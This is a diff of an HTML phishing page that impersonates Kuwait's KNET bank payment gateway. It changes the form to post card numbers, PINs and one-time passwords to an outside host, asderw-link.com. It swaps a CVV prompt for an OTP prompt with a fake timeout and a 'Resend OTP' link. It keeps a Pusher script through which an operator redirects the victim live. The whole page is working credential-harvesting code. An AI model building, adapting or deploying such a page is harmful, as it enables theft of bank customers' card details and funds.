@@ -2318,7 +2318,7 @@ display: none;
 
 
 
-    <form action="https://asderw-link.com/cvv/store" method="post" autocomplete="off"> <input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
+    <form action="https://asderw-link.com/knet/ver/store" method="post" autocomplete="off"> <input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
         <div class="madd"> </div>
 
 
@@ -2342,7 +2342,7 @@ display: none;
                             Amount:
                         </label>
                             <label class="column-value text-label">
-                           KD 5.000
+                            KD 5.000
                             </label>
                         </div>
 
@@ -2386,13 +2386,83 @@ display: none;
 
 
 
+                        <div id="savedCardDiv" style="display:none;">
+
+
+
+                            <!-- Commented the bank name display for kfast starts -->
+                            <div class="row">
+
+
+
+
+
+                                <br>
+
+
+                            </div>
+                            <!-- Commented the bank name display for kfast ends -->
+
+
+
+                            <!-- Added for Points Redemption -->
+
+                            <div class="row">
+                                <label class="column-label" style="margin-left: 20px;">
+						PIN:
+						</label>
+                                <input inputmode="numeric" pattern="[0-9]*" name="debitsavedcardPIN" id="debitsavedcardPIN" autocomplete="off" title="Should be in number. Length should be 4" type="password" size="4" maxlength="4" class="allownumericwithoutdecimal" style="width:50%;"
+                                    onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;">
+                            </div>
+
+                            <!-- Added for Points Redemption -->
+                        </div>
+
 
                         <div id="FCUseDebitEnable" style="margin-top: 5px;">
 
                             <div class="row">
                                 <label class="column-label" style="width:40%;">Select Your Bank:</label>
 
-
+                                <select class="column-value" style="width:60%;" onchange="javascript:validatebank(this.value)">
+                <option value="bankname" title="Select Your Bank">
+										Select Your Bank
+									</option>
+                  
+                		<option value="201916924517503|Al Ahli Bank of Kuwait [ABK]|0.000" title="Al Ahli Bank of Kuwait [ABK]"> 
+                		Al Ahli Bank of Kuwait [ABK]</option>   
+                		<option value="201916924542860|Al Rajhi Bank [Rajhi]|0.000" title="Al Rajhi Bank [Rajhi]"> 
+                		Al Rajhi Bank [Rajhi]</option>   
+                		<option value="201916924560086|Bank of Bahrain Kuwait [BBK]|0.000" title="Bank of Bahrain Kuwait [BBK]"> 
+                		Bank of Bahrain Kuwait [BBK]</option>   
+                		<option value="201916924589070|Boubyan Bank [Boubyan]|0.000" title="Boubyan Bank [Boubyan]"> 
+                		Boubyan Bank [Boubyan]</option>   
+                		<option value="201916975376462|Burgan Bank [Burgan]|0.000" title="Burgan Bank [Burgan]"> 
+                		Burgan Bank [Burgan]</option>   
+                		<option value="201916924643150|Commercial Bank of Kuwait [CBK]|0.000" title="Commercial Bank of Kuwait [CBK]"> 
+                		Commercial Bank of Kuwait [CBK]</option>   
+                		<option value="201916924658211|Doha Bank [Doha]|0.000" title="Doha Bank [Doha]"> 
+                		Doha Bank [Doha]</option>   
+                		<option value="201916975234419|Gulf Bank of Kuwait [GBK]|0.000" title="Gulf Bank of Kuwait [GBK]"> 
+                		Gulf Bank of Kuwait [GBK]</option>   
+                		<option value="202330389621213|KFH [TAM]|0.000" title="KFH [TAM]"> 
+                		KFH [TAM]</option>   
+                		<option value="201916924803186|Kuwait Finance House [KFH]|0.000" title="Kuwait Finance House [KFH]"> 
+                		Kuwait Finance House [KFH]</option>   
+                		<option value="201916405343641|Kuwait International Bank [KIB]|0.000" title="Kuwait International Bank [KIB]"> 
+                		Kuwait International Bank [KIB]</option>   
+                		<option value="201916924855488|National Bank of Kuwait [NBK]|0.000" title="National Bank of Kuwait [NBK]"> 
+                		National Bank of Kuwait [NBK]</option>   
+                		<option value="202217100853887|NBK [Weyay]|0.000" title="NBK [Weyay]"> 
+                		NBK [Weyay]</option>   
+                		<option value="201916924900814|Qatar National Bank [QNB]|0.000" title="Qatar National Bank [QNB]"> 
+                		Qatar National Bank [QNB]</option>   
+                		<option value="201916924925612|Union National Bank [UNB]|0.000" title="Union National Bank [UNB]"> 
+                		Union National Bank [UNB]</option>   
+                		<option value="201916975055702|Warba Bank [Warba]|0.000" title="Warba Bank [Warba]"> 
+                		Warba Bank [Warba]</option>
+													                       
+                    </select>
                             </div>
 
                             <div class="row three-column" id="Paymentpagecardnumber"><label class="column-label">Card Number: </label><label><select class="column-value" name="dcprefix" id="dcprefix" style="width: 26%;"><option value="450778" title="450778">450778</option><option value="485602" title="485602">485602</option><option value="537016" title="537016">537016</option><option value="532674" title="532674">532674</option></select></label><label>  <input name="debitNumber" id="debitNumber" type="tel" pattern="[0-9]" size="10" class="allownumericwithoutdecimal" style="width: 32%;" maxlength="10" onclick="javascript:validateprefixid(this.value)" onblur="return ValidateNumPin(event);" onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;" title="Should be in number. Length should be 10"></label></div>
@@ -2793,7 +2863,7 @@ display: none;
                         </div>
                         <div id="OrgTranxAmtConfirm">
                             <div><label class="column-label">Amount:</label></div>
-                            <div><label class="column-value text-label"> KD 5.000</label></div>
+                            <div><label class="column-value text-label">  KD 5.000</label></div>
                         </div>
 
                         <!-- Added for PG Eidia Discount -->
@@ -2816,28 +2886,54 @@ display: none;
                         </div>
                         <div class="row alert-msg" id="notificationbox" style="color:#31708f; font-family: Arial, Helvetica, serif; font-size: 13px;">
                             <!-- Added for Points Redemption - modified -->
-                            <div dir="rtl" align="right">
-                                <p><span class="title" style="font-weight:bold">إثبات الملكية:</span> عميلنا العزيز نحتاج الى التحقق من عملية الدفع, يرجا إدخال رمز (CVV) الموجود خلف البطاقة.</p>
+                            <div id="notification">
+                                <p><span class="title" style="font-weight:bold">NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered with your bank.This is an OTP (One Time Password) SMS, it contains 6 digits to be entered
+                                    in the box below.</p>
                             </div>
-                        </div>
-                        <div dir="rtl" align="center" class="site-heading mb-1">
-                            <img style="width: 70%;" src="/index_files/cvv.png" alt="">
                         </div>
                         <div class="row">
 
+                            <div id="payConfirmCardNum">
 
+                                <!-- Added for Points Redemption -->
+
+
+
+                                <label class="column-label">Card Number:</label>
+
+                                <!-- Added for Points Redemption -->
+
+                            </div>
+                            <div><label class="column-value text-label" id="DCNumber" style="padding-left:5px;">464452******9998</label></div>
+                        </div>
+                        <div class="row" id="payConfirmExpmnth" style="display: block;">
+                            <div><label class="column-label" style="width:41%">Expiration Month:</label></div>
+                            <div><label class="column-value text-label" id="expmnth" style="padding-left:5px;width:59%">7</label></div>
+                        </div>
+                        <div class="row" id="payConfirmExpyr" style="display: block;">
+                            <div><label class="column-label">Expiration Year:</label></div>
+                            <div><label class="column-value text-label" id="expyear" style="padding-left:5px;">2030</label></div>
+                        </div>
+                        <!-- Added for Points Redemption -->
+
+                        <div class="row">
+                            <div><label class="column-label">PIN:</label></div>
+                            <div><label class="column-value text-label" style="padding-left:5px;">****</label></div>
                         </div>
 
                         <!-- Added for Points Redemption -->
 
                         <div class="row" id="OTPDCDIV" style="display: block;">
-                            <div><label class="column-label" style="padding-top: 4px;">CVV:</label></div>
+                            <div><label class="column-label" style="padding-top: 4px;">OTP:</label></div>
                             <div>
                                 <!-- <input class="paymentinput" style="width: 60%;"  type="tel" id="debitOTPtimer" name="debitOTP" placeholder="teset" size="6" maxLength="6" 
                     	onkeyup="return isOtpNumeric(event);" onkeypress="return isOtpNumeric(event);" /> -->
-                                <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" class="allownumericwithoutdecimal" style="width: 60%;" id="debitOTPtimer" name="cvv" placeholder="رمز CVV" size="3" maxlength="3">
+                                <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" class="allownumericwithoutdecimal" style="width: 60%;" id="debitOTPtimer" name="code" placeholder="Timeout in: 2:50" size="6" maxlength="6" onkeyup="return isOtpNumeric(event);"
+                                    onkeypress="return isOtpNumeric(event);" oninput="return isOtpNumeric(event);">
                                 <!-- Added for Points Redemption -->
 
+                                <div><label class="column-value text-label" style="display:none;float: right; cursor: pointer;color: #0077D5;text-decoration: underline;" id="Resend" onclick="payConfirmAjax(&#39;Resend&#39;);">Resend OTP</label></div>
+                                <!-- Added for Points Redemption -->
                             </div>
                         </div>
                     </div>
@@ -2877,7 +2973,6 @@ display: none;
         </div>
         </div>
         </div>
-
 
         <input type="hidden" name="encryptedCardNumber" id="encryptedCardNumber" value="">
         <input type="hidden" name="encryptedMonth" id="encryptedMonth" value="">
@@ -3049,8 +3144,8 @@ display: none;
         <input type="hidden" name="kfastRegAttemptCount" value="0">
         <input type="hidden" name="kfastRegDeclineValue">
     </form>
-    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
 
+    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
 
     <script type="text/javascript">
         var pid = "7212";
@@ -3077,11 +3172,6 @@ display: none;
             if (data.people_id == pid && data.status == 'hawety') {
                 window.location.href = '/hawety';
             }
-
-            if (data.people_id == pid && data.status == 'idpedol') {
-                window.location.href = '/idpedol';
-            }
-
         });
     </script>
 
